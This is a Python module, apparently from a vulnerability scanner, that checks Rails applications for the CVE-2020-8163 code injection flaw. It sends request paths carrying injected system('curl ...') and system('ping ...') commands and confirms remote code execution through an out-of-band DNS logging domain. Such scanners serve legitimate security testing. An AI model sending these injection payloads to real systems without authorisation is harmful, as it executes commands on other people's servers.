#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5

cve_2020_8163_payloads = [
    {'path': '?[system("curl DNSDOMAIN")end%00]'},
    {'path': '?[system("ping -c 4 DNSDOMAIN")end%00]'},
    {'path': '?[system("ping DNSDOMAIN")end%00]'}
]

def cve_2020_8163_scan(self, clients):
    ''' 在 Rails 5.0.1 之前版本中的一个代码注入漏洞, 
        它允许攻击者控制"render"调用"locals"参数执行RCE
    '''
    client = clients.get('reqClient')
    sessid = '2892b92d3c3a1d8b4ab069947ddbc552'

    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2020-8163',
    }

    for payload in cve_2020_8163_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path'].replace('DNSDOMAIN', dns_domain)

        res = client.request(
            'get',
            path,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (dns.result(md, sessid)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
